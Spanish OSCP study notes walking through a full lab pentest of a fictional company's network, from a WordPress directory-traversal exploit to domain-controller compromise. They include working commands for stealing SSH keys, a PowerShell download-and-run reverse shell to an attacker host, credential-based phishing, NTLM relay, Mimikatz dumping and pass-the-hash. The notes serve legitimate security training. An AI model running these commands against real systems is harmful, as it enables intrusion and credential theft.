---
tipo: modulo
modulo: 27
estado: repasado
tags:
  - oscp
  - enumeracion
  - explotacion
  - privesc
  - ad
  - pivoting
  - linux
  - windows
fecha: 2026-10-09
---

# 27 - Assembling the Pieces

> [!abstract] Resumen
> Módulo "puente" entre los módulos individuales de PEN-200 y los Challenge Labs: un **pentest completo** contra la empresa ficticia **BEYOND Finances** (dominio `beyond.com`), combinando de principio a fin casi todas las técnicas del curso. Cadena de ataque: recon externo (Nmap/Gobuster/WPScan) → explotación de un plugin WordPress vulnerable (directory traversal, CVE-2020-11738) para robar `/etc/passwd` y una clave SSH → privesc Linux (crackeo de passphrase, abuso de `sudo git` vía GTFOBins, minado del historial de Git) → credential spraying con CrackMapExec → **phishing** con Windows Library files + WebDAV para conseguir un foothold en el dominio interno → enumeración con BloodHound/SharpHound → pivoting (Metasploit autoroute + SOCKS proxy + Chisel) → Kerberoasting de un usuario con SPN → abuso de un plugin de WordPress (Backup Migration) para forzar un **relay NTLM** (SMB signing deshabilitado) y obtener `SYSTEM` → extracción de credenciales cacheadas de un Domain Admin con Mimikatz → `Pass-the-Hash` con `impacket-psexec` hasta el controlador de dominio.
> Idea clave del examen: no existe una fase "aislada" — cada pieza de información (una SPN vista en BloodHound, un plugin con un campo de configuración raro, una sesión cacheada) se combina con las demás en etapas posteriores. Enumerar a fondo y tomar notas detalladas es más rentable que perseguir un "golpe rápido".

## Conceptos clave
- **Challenge Lab Zero**: módulo pensado como puente hacia los Challenge Labs — red VM completa (no ejecutable en Kali-in-Browser), sin guía paso a paso tan explícita como en otros módulos a partir de cierto punto.
- **Directory Traversal no autenticado en un plugin de WordPress (Duplicator, CVE-2020-11738)**: el endpoint `wp-admin/admin-ajax.php?action=duplicator_download&file=...` permite leer **cualquier fichero del sistema** sin autenticación, manipulando el parámetro `file` con `../`.
- **Minar el historial de Git** (`git log` + `git show <hash>`) encuentra secretos en ficheros que ya no existen en el `HEAD` actual — borrar un fichero de un repo no borra su contenido del historial.
- **Credential spraying con CrackMapExec** permite distinguir `STATUS_LOGON_FAILURE` (usuario válido, password incorrecta) de errores de usuario inválido, y `--shares` evalúa permisos de lectura/escritura sobre los recursos compartidos SMB de golpe para varios hosts.
- **Phishing dirigido (spear phishing) con pretexto creíble**: usar información real descubierta en el reconocimiento (ej. el hallazgo del script `fetch_current.sh` en el historial de Git) como "gancho" de legitimidad en el correo de phishing aumenta mucho la tasa de éxito.
- **BloodHound como primer paso de la enumeración de AD**: se usa *antes* que PowerView/LDAP porque reduce la sobrecarga de información de métodos más granulares. Si las queries pre-construidas de BloodHound no dan vectores accionables, es la señal para pasar a métodos más manuales (PowerView, LDAP).
- **Marcar usuarios como "Owned" en BloodHound** habilita queries basadas en rutas (ej. "Shortest Path to Domain Admins from Owned Principals").
- **SMB signing deshabilitado** en dos o más hosts es la condición necesaria para un **relay NTLM**: si se puede forzar que una máquina intente autenticarse por SMB contra un atacante (vía `impacket-ntlmrelayx`), esa autenticación se puede reenviar ("relay") a otra máquina vulnerable sin necesidad de craquear el hash.
- **Forzar autenticación NTLM desde una aplicación web**: cualquier campo de configuración de una app que acepte una ruta UNC (`//IP/share`) y la "visite" al guardar (ej. un plugin de backup comprobando dónde guardar los ficheros) es un vector para forzar esa autenticación hacia un listener propio.
- **Credenciales cacheadas (Mimikatz `sekurlsa::logonpasswords`)**: si un usuario privilegiado (ej. un Domain Admin) ha iniciado sesión alguna vez en un host (vía RDP, un servicio, una tarea programada...), sus credenciales pueden seguir en memoria (LSASS) de ese host, incluso si ya no tiene sesión activa visible.
- **`impacket-psexec` con `-hashes`**: permite moverse lateralmente con el hash NTLM de una cuenta (Pass-the-Hash) sin necesidad de la contraseña en texto plano, incluso a través de `proxychains` si el controlador de dominio solo es visible internamente.

> [!tip] Idea para el examen
> Flujo general reutilizable para un engagement completo: (1) recon externo exhaustivo (puertos, tecnologías, plugins/versiones) antes de explotar nada; (2) tras cada shell nueva, situational awareness completo (usuario, red, AV, sesiones) antes de intentar privesc; (3) BloodHound primero en cualquier entorno AD — si no da vectores, pasar a PowerView/LDAP manual; (4) cuando encuentres credenciales o sesiones de un usuario privilegiado en un host, piensa en **Mimikatz** antes que en exploits; (5) un campo de configuración de una app que acepta una ruta de red es candidato a forzar relay NTLM si hay SMB signing deshabilitado en el objetivo; (6) nunca dejes de tomar notas — información "inútil" en el momento (una SPN, un plugin instalado, una sesión activa) puede ser la pieza que falta dos fases después.

---

## 27.1–27.2. Reconocimiento externo y explotación de WordPress (MAILSRV1)

Nmap identifica servicios expuestos en el perímetro; Gobuster y WhatWeb fingerprintan la stack web; WPScan enumera plugins de WordPress (sin necesidad de API key para enumeración básica de plugins).

```bash
sudo nmap -sC -sV -oN nmap_external.txt <IP_MAILSRV1> <IP_WEBSRV1>
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
whatweb http://<target>
wpscan --url http://<target> --enumerate p --plugins-detection aggressive
```
| Flag / parte | Qué hace |
|---|---|
| `-sC -sV` | scripts por defecto + detección de versión (Nmap) |
| `--enumerate p` | WPScan: enumera plugins instalados |
| `--plugins-detection aggressive` | prueba rutas de plugins conocidos aunque no se detecten pasivamente (más lento, más completo) |

WPScan revela el plugin **Duplicator**, vulnerable a **directory traversal no autenticado** (CVE-2020-11738) vía `admin-ajax.php`. Tras confirmar la CVE con `searchsploit`, se explota manualmente:

```bash
searchsploit duplicator wordpress
searchsploit -x <ruta_exploit>                 # leer el PoC antes de usarlo
curl "http://<target>/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../etc/passwd"
```

`/etc/passwd` revela usuarios del sistema. Reutilizando el mismo traversal, se apunta a la clave SSH privada de un usuario identificado:

```bash
curl "http://<target>/wp-admin/admin-ajax.php?action=duplicator_download&file=../../../../../../home/<user>/.ssh/id_rsa" -o id_rsa
```

La clave está protegida por passphrase. Se crackea offline:

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
chmod 600 id_rsa
ssh -i id_rsa <user>@<IP_MAILSRV1>
```
| Flag / parte | Qué hace |
|---|---|
| `ssh2john` | convierte la clave privada cifrada a un formato crackeable por John |
| `chmod 600 id_rsa` | SSH rechaza claves con permisos demasiado abiertos |

Ver notas → [[WordPress Duplicator - Directory Traversal (CVE-2020-11738)]] · [[Password Cracking (Hashcat y John)]].

---

## 27.2.2. Privesc Linux y minado del historial de Git

Con shell SSH de bajo privilegio, enumeración automatizada con LinPEAS:

```bash
python3 -m http.server 8000                                  # en Kali, servir linpeas.sh
wget http://<IP_kali>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

`sudo -l` revela permiso sobre `git` sin restricción de subcomandos. Se abusa vía GTFOBins (escape del pager `less` que `git` invoca internamente):

```bash
sudo git -p help config
# dentro del pager (less):
!/bin/bash
```

Ya como root (o usuario con más privilegio), se revisa un repositorio Git local del sitio en busca de secretos **eliminados** en commits anteriores — borrar un fichero no borra su contenido del historial:

```bash
cd /ruta/al/repo
git log --all --oneline
git show <hash_commit>                 # ver el diff exacto de un commit sospechoso
```

Un commit antiguo contiene un script `fetch_current.sh` ya eliminado del `HEAD`, con una credencial `sshpass` embebida (usuario + contraseña en texto plano) usada para sincronizar datos con otro servidor. Esta credencial se reutiliza más adelante como pretexto de phishing (es información real y verificable, lo que aumenta mucho la credibilidad del correo).

> [!warning] Errores comunes / cosas que fallan
> - Usar `git checkout <hash>` para "volver" a un commit antiguo en un sitio en producción — puede romper la web activa. Mejor usar `git show <hash>` (solo lectura del diff) sin tocar el working tree.
> - Dar por bueno un único escaneo de LinPEAS/WinPEAS sin revisar manualmente los "false negatives" — WinPEAS, por ejemplo, puede misreportar la versión de SO (ver 27.4.1 más abajo).

Ver notas → [[Abusing Sudo (GTFOBins)]] · [[Minar el Historial de Git en Busca de Secretos]] · [[LinPEAS]].

---

## 27.3. Acceso a la red interna: spraying y phishing

### 27.3.1. Domain credentials — credential spraying

Con las credenciales encontradas hasta ahora (incluida la del script `fetch_current.sh`), se rocía contra todos los hosts conocidos con CrackMapExec:

```bash
crackmapexec smb <lista_IPs> -u <lista_users> -p <lista_passwords> --continue-on-success
crackmapexec smb <lista_IPs> -u <user_valido> -p <password_valida> --shares
```
| Flag / parte | Qué hace |
|---|---|
| `--continue-on-success` | sigue probando combinaciones tras un acierto, en vez de parar en el primer login válido |
| `STATUS_LOGON_FAILURE` | usuario **válido**, contraseña incorrecta (distinto de un error de usuario inexistente) |
| `--shares` | tras autenticar, enumera los recursos SMB compartidos y los permisos de lectura/escritura sobre cada uno |

### 27.3.2. Phishing para conseguir acceso al dominio interno

Ninguna credencial válida da acceso administrativo directo, así que se recurre a **phishing dirigido**. Se reutiliza la técnica de Windows Library files (`.Library-ms`) + acceso directo (`.lnk`) del módulo de Client-Side Attacks, combinada con un servidor **WebDAV**:

```bash
sudo pip3 install wsgidav cheroot
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /ruta/compartida
```

El acceso directo (`.lnk`) apunta al recurso WebDAV y descarga/ejecuta **PowerCat** vía download cradle de PowerShell, estableciendo una reverse shell:

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://<IP_kali>/powercat.ps1'); powercat -c <IP_kali> -p <puerto> -e powershell
```

El correo de phishing se envía con **swaks**, usando las credenciales SMTP robadas y un pretexto construido a partir del hallazgo real del script `fetch_current.sh` en el historial de Git (le da legitimidad: el remitente "sabe" de un script interno real):

```bash
swaks --to <victima>@beyond.com --from <remitente_creible>@beyond.com \
  --server <IP_MAILSRV1> --auth LOGIN --auth-user <user_smtp> --auth-password '<pass_smtp>' \
  --attach @libreria_maliciosa.Library-ms --header "Subject: ..." --body @cuerpo_correo.txt
```

La víctima ejecuta el archivo en su estación de trabajo (**CLIENTWK1**), dando un foothold como usuario de dominio no administrador dentro de la red interna.

> [!tip] Idea para el examen
> Un pretexto de phishing construido con información **real** descubierta durante la enumeración (nombre de un script interno, un proceso de negocio verídico) es mucho más efectivo que una plantilla genérica — y es exactamente el tipo de correlación entre fases que este módulo quiere enseñar.

Ver notas → [[AD Password Spraying]] · [[Windows Library Files (.Library-ms)]] · [[CrackMapExec - Spraying de Credenciales]].

---

## 27.4.1. Situational awareness interno (CLIENTWK1)

Desde la reverse shell en CLIENTWK1, enumeración estándar: WinPEAS, comprobación de AV, interfaces de red y caché DNS (para inferir roles de otros hosts por IP/hostname).

```powershell
iwr -uri http://<IP_kali>:8000/winPEASx64.exe -Outfile winpeas.exe
.\winpeas.exe
systeminfo                      # confirmar versión real de Windows — WinPEAS puede reportar mal (ej. Win11 como Win10)
ipconfig /all ; ipconfig /displaydns
```

> [!warning] WinPEAS puede **misreportar** la versión de Windows (ej. mostrar Windows 10 en un host que en realidad es Windows 11) — siempre confirmar con `systeminfo` antes de descartar vectores por versión de SO.

Enumeración de Active Directory con **BloodHound/SharpHound**, usado como primer paso porque reduce la sobrecarga de información frente a métodos más granulares (PowerView/LDAP manual):

```powershell
Import-Module .\Sharphound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory . -OutputPrefix "audit"
```

En Kali, tras subir los datos a BloodHound (`neo4j` como backend), se marca el usuario comprometido como **Owned** y se ejecutan queries personalizadas (Cypher) y predefinidas:

```text
MATCH (m:Computer) RETURN m                     # todos los equipos del dominio
MATCH (m:User) RETURN m                         # todos los usuarios
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p    # sesiones activas en todo el dominio
```

Queries pre-construidas (pestaña Analysis): *Find all Domain Admins*, *Find Workstations/Servers where Domain Users can RDP*, *Find Computers where Domain Users are Local Admin*, *Shortest Path to Domain Admins from Owned Principals*. Ninguna de ellas da un vector accionable directo — señal de que hay que combinar la información (sesiones activas, SPNs) con otros métodos en vez de depender solo de rutas automáticas.

Ver notas → [[BloodHound]] · [[winPEAS]].

---

## 27.4.2. Servicios, sesiones y pivoting hacia la red interna

La query de sesiones activas (`MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p`) revela tres sesiones interesantes: el Domain Admin **beccy** con sesión activa en **MAILSRV1**, el usuario comprometido **marcus** en **CLIENTWK1**, y una sesión del *Administrator local* (SID terminado en `-500`) en **INTERNALSRV1**. Revisando el nodo del usuario **daniela** en BloodHound (pestaña *Node Info*), aparece un **SPN** (`http/internalsrv1.beyond.com`) — es decir, es **kerberoastable**.

Para alcanzar la red interna (172.16.6.0/24) desde Kali, se sube un payload Meterpreter a CLIENTWK1 y se configura un listener en Metasploit:

```bash
sudo msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP_kali> ; set LPORT 443 ; set ExitOnSession false
run -j
```
```powershell
# En CLIENTWK1
iwr -uri http://<IP_kali>:8000/met.exe -Outfile met.exe
.\met.exe
```

Con la sesión Meterpreter activa, se enruta la red interna y se levanta un proxy SOCKS:

```text
use multi/manage/autoroute ; set session <id> ; run
use auxiliary/server/socks_proxy ; set SRVHOST 127.0.0.1 ; set VERSION 5 ; run -j
```

Con `/etc/proxychains4.conf` apuntando a `socks5 127.0.0.1 1080`, se enumeran los hosts internos vía proxychains:

```bash
proxychains -q crackmapexec smb <IPs_internas> -u john -d beyond.com -p '<password>' --shares
sudo proxychains nmap -sT -oN nmap_servers -Pn -p 21,80,443 <IPs_internas>    # -sT obligatorio sobre SOCKS
```

El escaneo revela: **MAILSRV1** e **INTERNALSRV1** tienen **SMB signing deshabilitado** (clave para el relay NTLM de la sección 27.5.2), y **INTERNALSRV1** tiene un servidor web (WordPress) en los puertos 80/443.

Para navegar cómodamente a ese WordPress sin depender de Proxychains + navegador configurado con SOCKS, se usa **Chisel** con reenvío de puerto inverso desde CLIENTWK1:

```bash
chisel server --port 8080 --reverse          # en Kali
```
```powershell
# En CLIENTWK1 (vía la shell de Meterpreter)
.\chisel.exe client <IP_kali>:8080 R:80:172.16.6.241:80
```

Esto permite abrir `http://127.0.0.1/wordpress/` en el navegador de Kali y llegar directamente al WordPress de INTERNALSRV1.

> [!warning] Errores comunes / cosas que fallan
> - `nmap` sobre Proxychains **requiere** `-sT` (TCP connect) — un SYN scan (`-sS`) no funciona a través de un proxy SOCKS.
> - CrackMapExec puede lanzar `The NETBIOS connection with the remote host is timed out` contra un DC en versiones antiguas (5.4.0) — actualizar a 5.4.1+ soluciona el problema.

Ver notas → [[Pivoting con Meterpreter SOCKS Proxy]] · [[HTTP Tunneling con Chisel]] · [[Proxychains]] · [[CrackMapExec - Spraying de Credenciales]].

---

## 27.5. Ataque a la aplicación web interna

### 27.5.1. Kerberoasting de daniela y acceso a WordPress

Con la SPN identificada en BloodHound (`daniela`), se solicita el ticket de servicio (TGS) y se crackea offline:

```bash
proxychains -q impacket-GetUserSPNs -request -dc-ip <IP_DC> beyond.com/john:'<password>'
sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
```

El hash se crackea, dando la contraseña en texto plano de `daniela`, con la que se inicia sesión en el panel de WordPress de INTERNALSRV1.

### 27.5.2. Abuso de un plugin de WordPress para un ataque de relay

Ya dentro del panel de WordPress, revisando los plugins instalados solo **Backup Migration** está activo. Su configuración expone un campo **Backup directory path** que acepta una ruta de red (UNC) y la "visita" al guardar — un vector perfecto para forzar una autenticación SMB saliente.

Dado que **MAILSRV1** e **INTERNALSRV1** tienen SMB signing deshabilitado (hallazgo de 27.4.2) y ambos comparten la misma contraseña para el *Administrator* local, el plan es: forzar que WordPress (corriendo como el *Administrator* local de INTERNALSRV1) se autentique contra Kali, y **relayar** esa autenticación hacia MAILSRV1 con `impacket-ntlmrelayx`, obteniendo ejecución de código como `Administrator` → `SYSTEM` en MAILSRV1.

```bash
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.242 \
  -c "powershell -enc <base64_de_powercat_reverse_shell>"
nc -nvlp 9999
```
| Flag / parte | Qué hace |
|---|---|
| `--no-http-server` | desactiva el listener HTTP de ntlmrelayx (solo se necesita SMB) |
| `-smb2support` | soporta SMBv2, necesario para los hosts modernos del lab |
| `-t <IP>` | host destino del relay (MAILSRV1, con SMB signing deshabilitado) |
| `-c "..."` | comando ejecutado en el destino tras el relay exitoso — aquí, un one-liner PowerShell en base64 (`-enc`) que lanza una reverse shell hacia el puerto 9999 |

En WordPress, se cambia el **Backup directory path** a `//<IP_kali>/test` (ruta inexistente — solo sirve para forzar la autenticación SMB) y se guarda:

```text
Backup directory path: //192.168.119.5/test
```

Al guardar, el plugin intenta acceder a esa ruta, autenticándose por SMB contra Kali como `INTERNALSRV1$Administrator`; `ntlmrelayx` relaya esa autenticación hacia MAILSRV1, confirmando que ambos hosts comparten contraseña de administrador local, y ejecuta el comando configurado → llega la reverse shell como `NT AUTHORITY\SYSTEM` en MAILSRV1.

> [!warning] Errores comunes / cosas que fallan
> - El relay solo funciona si el destino (`-t`) tiene **SMB signing deshabilitado** — contra un host con signing habilitado, `ntlmrelayx` fallará aunque la autenticación llegue correctamente.
> - Si el campo de configuración de la app cachea el resultado anterior, puede hacer falta recargar/forzar un nuevo guardado para disparar una nueva petición.

Ver notas → [[NTLM Relay Forzado desde una Aplicacion Web (ntlmrelayx)]] · [[Kerberoasting]] · [[Password Cracking (Hashcat y John)]].

---

## 27.6. Acceso al controlador de dominio

### 27.6.1. Credenciales cacheadas (Mimikatz)

La sesión `SYSTEM` obtenida en MAILSRV1 (vía reverse shell + nuevo `met.exe`/`multi/handler`, igual que en 27.4.2) permite usar Mimikatz. Recordando que el Domain Admin **beccy** tenía una sesión activa en MAILSRV1 (dato de BloodHound, sección 27.4.2), sus credenciales deberían seguir cacheadas en LSASS:

```powershell
iwr -uri http://<IP_kali>:8000/mimikatz.exe -Outfile mimikatz.exe
.\mimikatz.exe
```
```text
privilege::debug
sekurlsa::logonpasswords
```

El resultado expone tanto el **hash NTLM** como la **contraseña en texto plano** de `beccy` (mecanismo WDigest/Kerberos cacheado), Domain Admin de `beyond.com`.

### 27.6.2. Lateral movement al controlador de dominio

Con el hash NTLM de `beccy`, `impacket-psexec` (Pass-the-Hash) a través de Proxychains da shell `SYSTEM` directamente en el controlador de dominio:

```bash
proxychains -q impacket-psexec -hashes 00000000000000000000000000000000:<hash_ntlm_beccy> beccy@<IP_DCSRV1>
```
```text
whoami    -> nt authority\system
hostname  -> DCSRV1
```

Con esto se cumplen los dos objetivos del pentest: obtener privilegios de Domain Admin y acceso al controlador de dominio.

> [!warning] Errores comunes / cosas que fallan
> - Olvidar `proxychains` delante de `impacket-psexec` cuando el DC solo es alcanzable a través del pivote — el comando fallará con timeout en vez de error de autenticación.
> - No volver a comprobar `sessions -i` en Metasploit tras un rato — CLIENTWK1/MAILSRV1 pueden perder la sesión si el proceso inyectado termina.

Ver notas → [[Mimikatz]] · [[Pass-the-Hash]] · [[Proxychains]].

---

## Ejemplo práctico
> [!example] Cadena de ataque completa — BEYOND Finances (beyond.com)
> 1. Nmap + WPScan contra MAILSRV1/WEBSRV1 revelan el plugin **Duplicator** vulnerable (CVE-2020-11738) → directory traversal no autenticado lee `/etc/passwd` y luego la clave SSH privada de un usuario → `ssh2john` + `john` crackean la passphrase → shell SSH.
> 2. LinPEAS revela `sudo git` sin restricciones → escape vía pager (`sudo git -p help config` → `!/bin/bash`) → revisando el historial de Git del sitio (`git log`/`git show`) se encuentra un script eliminado (`fetch_current.sh`) con credenciales `sshpass` en texto plano.
> 3. CrackMapExec rocía esas credenciales (y otras encontradas) contra todos los hosts conocidos — ninguna da admin directo, así que se monta un ataque de **phishing dirigido**: Windows Library file + WebDAV + PowerCat, enviado por `swaks` usando credenciales SMTP robadas y un pretexto basado en el hallazgo real de `fetch_current.sh` → un usuario de CLIENTWK1 lo ejecuta → foothold interno.
> 4. WinPEAS + BloodHound/SharpHound enumeran el dominio: Domain Admin `beccy` tiene sesión activa en MAILSRV1; `daniela` es kerberoastable (SPN en INTERNALSRV1); ninguna query pre-construida de BloodHound da una ruta directa → toca combinar hallazgos manualmente.
> 5. Se pivota con un Meterpreter (`met.exe`) + `autoroute` + `socks_proxy`; CrackMapExec y Nmap vía Proxychains revelan SMB signing deshabilitado en MAILSRV1 e INTERNALSRV1, y un WordPress en INTERNALSRV1 (accedido cómodamente vía **Chisel** con reenvío de puerto inverso).
> 6. Kerberoasting de `daniela` (`impacket-GetUserSPNs` + `hashcat -m 13100`) da su contraseña → login en WordPress → el plugin **Backup Migration** acepta una ruta UNC en su configuración → se fuerza esa ruta hacia Kali y se relaya con `impacket-ntlmrelayx` (aprovechando el SMB signing deshabilitado) hacia MAILSRV1, que comparte password de Administrator local con INTERNALSRV1 → shell `SYSTEM` en MAILSRV1.
> 7. Mimikatz (`sekurlsa::logonpasswords`) extrae las credenciales cacheadas del Domain Admin `beccy` (sesión vista antes en BloodHound) → `impacket-psexec` con su hash NTLM (Pass-the-Hash), vía Proxychains, da shell `SYSTEM` en el controlador de dominio **DCSRV1** → objetivos del pentest cumplidos.

## Relacionado
- Técnicas: [[WordPress Duplicator - Directory Traversal (CVE-2020-11738)]] · [[Abusing Sudo (GTFOBins)]] · [[Minar el Historial de Git en Busca de Secretos]] · [[CrackMapExec - Spraying de Credenciales]] · [[Windows Library Files (.Library-ms)]] · [[BloodHound]] · [[Pivoting con Meterpreter SOCKS Proxy]] · [[HTTP Tunneling con Chisel]] · [[Proxychains]] · [[Kerberoasting]] · [[NTLM Relay Forzado desde una Aplicacion Web (ntlmrelayx)]] · [[Mimikatz]] · [[Pass-the-Hash]] · [[Password Cracking (Hashcat y John)]] · [[LinPEAS]] · [[winPEAS]]
- Cheatsheet: [[Web]] · [[Privesc Linux]] · [[Active Directory]] · [[Enumeracion]] · [[Pivoting y Tunneling]] · [[Metasploit]]
- Módulo previo: [[26 - Attacking AWS Cloud Infrastructure]]
- Máquinas donde lo usé: [[]]

## Dudas
> [!question]
> - Repasar otras CVEs conocidas de plugins populares de WordPress (Duplicator, Backup Migration y similares) para reconocer el patrón "campo de configuración con ruta de red = relay NTLM potencial" más rápido en el examen.
> - Practicar el flujo BloodHound → "sin vector accionable" → PowerView/LDAP manual con un laboratorio donde sí haga falta llegar hasta el final de ese fallback (en este módulo no hizo falta, las sesiones activas fueron suficientes).
> - Repasar en qué otros contextos (más allá de un plugin de backup) una app web puede aceptar una ruta UNC y disparar sola la autenticación — mapear mentalmente varios ejemplos para no depender de reconocer uno concreto.
</content>
